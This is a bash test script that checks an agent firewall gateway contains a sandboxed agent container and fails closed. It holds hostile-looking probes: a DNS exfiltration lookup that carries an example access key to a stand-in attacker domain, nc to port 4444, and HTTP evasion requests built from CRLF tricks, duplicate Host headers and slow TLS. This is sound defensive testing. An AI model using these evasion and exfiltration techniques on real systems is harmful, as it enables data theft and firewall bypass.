#!/usr/bin/env bash
# Real network isolation test (ENF-07): proves that an enrolled agent cannot leave without the
# gateway, even when it ignores proxy settings. Needs Docker with Compose v2.
#   deploy/docker/isolation-test/run.sh          # build, run every check, tear down
#   KEEP=1 deploy/docker/isolation-test/run.sh   # leave the stack up for inspection
set -uo pipefail
cd "$(dirname "$0")" || exit
dc() { docker compose -f docker-compose.yml "$@"; }
pass=0; fail=0
check() { # name, expected (ok|ko), command...
  local name="$1" want="$2"; shift 2
  local out rc
  out="$("$@" 2>&1)"; rc=$?
  if { [ "$want" = ok ] && [ $rc -eq 0 ]; } || { [ "$want" = ko ] && [ $rc -ne 0 ]; }; then
    echo "PASS  $name"; pass=$((pass + 1))
  else
    echo "FAIL  $name (exit $rc)"; fail=$((fail + 1))
  fi
  printf '%s\n' "$out" | sed 's/^/      | /' | head -n 6
}
agent() { dc exec -T agent "$@"; }

cleanup() { [ "${KEEP:-0}" = 1 ] || dc down -v --remove-orphans >/dev/null 2>&1; }
trap cleanup EXIT

dc up -d --build --wait gateway web >/dev/null || { dc logs gateway; exit 1; }
dc up -d afw-net agent >/dev/null || exit 1
for _ in $(seq 1 30); do agent test -s /afw-ca/bundle.pem 2>/dev/null && break; sleep 1; done

echo "== routes seen by the agent"; agent ip route | sed 's/^/      | /'

check "agent: direct IP (no DNS, no proxy) -> 403 from the gateway" ok \
  agent sh -c "out=\$(curl -s -m 8 --noproxy '*' -w ' %{http_code}' http://198.18.99.20/); echo \"\$out\"; case \"\$out\" in *'blocked by agents-firewall'*403) exit 0;; *) exit 1;; esac"
check "agent: a denied name does not resolve" ko \
  agent sh -c "getent hosts denied.example"
check "agent: proxy ignored, denied domain (address known anyway) -> explicit 403" ok \
  agent sh -c "out=\$(curl -s -m 8 --noproxy '*' --resolve denied.example:80:198.18.99.20 -w ' %{http_code}' http://denied.example/); echo \"\$out\"; case \"\$out\" in *'blocked by agents-firewall: denied.example not allowed for test-bot (rule default-deny)'*403) exit 0;; *) exit 1;; esac"
check "agent: proxy ignored, allowed domain -> 200" ok \
  agent sh -c "out=\$(curl -s -m 8 --noproxy '*' -w ' %{http_code}' http://allowed.example/); echo \"\$out\"; case \"\$out\" in *hello-from-web*200) exit 0;; *) exit 1;; esac"
check "agent: HTTPS to a denied domain -> explicit 403 over inspected TLS" ok \
  agent sh -c "out=\$(curl -s -m 8 --noproxy '*' --resolve denied.example:443:198.18.99.20 -w ' %{http_code}' https://denied.example/); echo \"\$out\"; case \"\$out\" in *'blocked by agents-firewall'*403) exit 0;; *) exit 1;; esac"
check "agent: nc to an arbitrary external TCP port is refused (even to an allowed host's address)" ko \
  agent sh -c "printf 'ping\n' | nc -w 5 198.18.99.20 4444 | grep -q ping"
check "agent: dig @8.8.8.8 for a denied name gets no answer (REFUSED)" ok \
  agent sh -c "out=\$(dig +tries=1 +time=4 @8.8.8.8 denied.example A); echo \"\$out\" | grep -E 'status|ANSWER:'; echo \"\$out\" | grep -q 'status: REFUSED' && echo \"\$out\" | grep -q 'ANSWER: 0'"
check "agent: dig for an allowed name is answered by the gateway's resolver" ok \
  agent sh -c "dig +short +tries=1 +time=4 @8.8.8.8 allowed.example A | grep -x 198.18.99.20"
check "agent: cannot change its route (no NET_ADMIN)" ko \
  agent ip route replace default via 10.99.0.20
check "agent: the only path out is the gateway" ok \
  agent sh -c "ip route get 198.18.99.20 | tee /dev/stderr | grep -q 'via 10.99.0.2'"

# --- Review of PR #15: evasions of the HTTP pipeline and of the DNS filter -------------------
# Raw request (printf format, interpreted inside the agent) to the web server's address, port 80.
raw() { agent sh -c "printf '$1' | nc -w 5 198.18.99.20 80"; }
expect_blocked() { local out; out="$(raw "$1")"; printf '%s\n' "$out" | grep -m1 -E 'HTTP/|blocked'; printf '%s' "$out" | grep -q "${2:-blocked by agents-firewall}" && ! printf '%s' "$out" | grep -q hello-from-web; }
case_crlf()     { expect_blocked 'GET / HTTP/1.1\r\nHost: denied.example\r\nConnection: close\r\n\r\n' && expect_blocked '\r\nGET / HTTP/1.1\r\nHost: denied.example\r\nConnection: close\r\n\r\n'; }
case_propfind() { expect_blocked 'PROPFIND / HTTP/1.1\r\nHost: denied.example\r\nConnection: close\r\n\r\n'; }
case_absolute() { expect_blocked 'GET http://allowed.example/ HTTP/1.1\r\nHost: denied.example\r\nConnection: close\r\n\r\n' 'rule host-mismatch'; }
case_two_hosts() { expect_blocked 'GET / HTTP/1.1\r\nHost: allowed.example\r\nHost: denied.example\r\nConnection: close\r\n\r\n' 'HTTP/1.1 40[03]'; }
case_slow_tls() { local out; out="$(agent sh -c "(printf '\026'; sleep 2; printf '\003\001\000\005hello') | nc -w 4 198.18.99.20 80" 2>/dev/null)"; echo "received: ${#out} bytes"; [ -z "$out" ]; }
case_exfil()    { agent sh -c "dig +tries=1 +time=4 @10.99.0.2 akiaiosfodnn7example.exfil.attacker.test A" | grep -E 'status: REFUSED'; }
case_metrics()  { agent curl -s -m 5 http://10.99.0.2:9090/metrics; }
case_ca()       { agent curl -s -m 5 http://10.99.0.2:3128/ca.crt | grep -m1 'BEGIN CERTIFICATE'; }
check "agent: request line with a leading empty line, denied Host -> 403 (never raw L4)" ok case_crlf
check "agent: unlisted method (PROPFIND), denied Host -> 403" ok case_propfind
check "agent: absolute URI allowed.example + Host denied.example -> host-mismatch" ok case_absolute
check "agent: two Host headers -> refused" ok case_two_hosts
check "agent: slow TLS preamble (first byte, pause) is cut, nothing relayed" ok case_slow_tls
check "agent: DNS exfiltration name -> REFUSED (never resolved upstream)" ok case_exfil
check "agent: gateway metrics are not reachable from the agents" ko case_metrics
check "agent: public inspection CA is served on the proxy port" ok case_ca

echo "== stopping the gateway"
dc stop gateway >/dev/null
check "gateway down: no network at all (fail closed)" ko \
  agent curl -s -m 6 --noproxy '*' http://allowed.example/
check "gateway down: no DNS" ko \
  agent dig +short +tries=1 +time=3 @8.8.8.8 allowed.example A

echo "== result: $pass passed, $fail failed"
[ "$fail" -eq 0 ]
